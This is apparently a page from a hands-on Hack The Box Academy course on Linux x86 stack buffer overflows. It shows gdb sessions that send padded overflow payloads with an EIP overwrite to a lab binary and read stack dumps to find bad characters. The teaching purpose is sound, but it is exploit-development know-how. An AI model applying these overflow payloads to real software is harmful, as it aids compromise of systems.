<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/31/section/391
// Platform Version: V1
// Module ID: 31
// Module Name: Stack-Based Buffer Overflows on Linux x86
// Module Difficulty: Medium
// Section ID: 391
// Section Title: Identification of Bad Characters
// Page Title: Stack-Based Buffer Overflows on Linux x86
// Page Number: 08
-->

# Identification of Bad Characters

**Module Name:** Stack-Based Buffer Overflows on Linux x86 **Page Number:** 08

#### STACK-BASED BUFFER OVERFLOWS ON LINUX X86

# Identification of Bad Characters

#### Character List

``` shell-session
[!bash!]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

#### Calculate CHARS Length

``` shell-session
[!bash!]$ echo $CHARS | sed 's/\\x/ /g' | wc -w

256
```

#### Notes

``` shell-session
Buffer = "\x55" * (1040 - 256 - 4) = 780
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

``` shell-session
(gdb) disas main
Dump of assembler code for function main:
   0x56555582 <+0>: 	lea    ecx,[esp+0x4]
   0x56555586 <+4>: 	and    esp,0xfffffff0
   0x56555589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x5655558c <+10>:	push   ebp
   0x5655558d <+11>:	mov    ebp,esp
   0x5655558f <+13>:	push   ebx
   0x56555590 <+14>:	push   ecx
   0x56555591 <+15>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555596 <+20>:	add    ebx,0x1a3e
   0x5655559c <+26>:	mov    eax,ecx
   0x5655559e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x565555a1 <+31>:	add    eax,0x4
   0x565555a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x565555a6 <+36>:	sub    esp,0xc
   0x565555a9 <+39>:	push   eax
   0x565555aa <+40>:	call   0x5655554d <bowfunc>		# <---- bowfunc Function
   0x565555af <+45>:	add    esp,0x10
   0x565555b2 <+48>:	sub    esp,0xc
   0x565555b5 <+51>:	lea    eax,[ebx-0x1974]
   0x565555bb <+57>:	push   eax
   0x565555bc <+58>:	call   0x565553e0 <puts@plt>
   0x565555c1 <+63>:	add    esp,0x10
   0x565555c4 <+66>:	mov    eax,0x1
   0x565555c9 <+71>:	lea    esp,[ebp-0x8]
   0x565555cc <+74>:	pop    ecx
   0x565555cd <+75>:	pop    ebx
   0x565555ce <+76>:	pop    ebp
   0x565555cf <+77>:	lea    esp,[ecx-0x4]
   0x565555d2 <+80>:	ret    
End of assembler dump.
```

#### GDB Breakpoint

``` shell-session
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

#### Send CHARS

``` shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555551 in bowfunc ()
```

#### The Stack

``` shell-session
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				 # |---> "\x55"s begin

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

#### The Stack - CHARS

``` shell-session
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												 # |---> CHARS begin

0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

#### Notes

``` shell-session
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
 CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
 
   EIP = "\x66" * 4
```

#### Send CHARS - Without Null Byte

``` shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

#### The Stack

``` shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

#### Notes

``` shell-session
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 254 - 4) = 782	

# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```

#### Send CHARS - Without "\x00" & "\x09"

``` shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

#### The Stack

``` shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x0a" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

# 

# 

#### Questions

####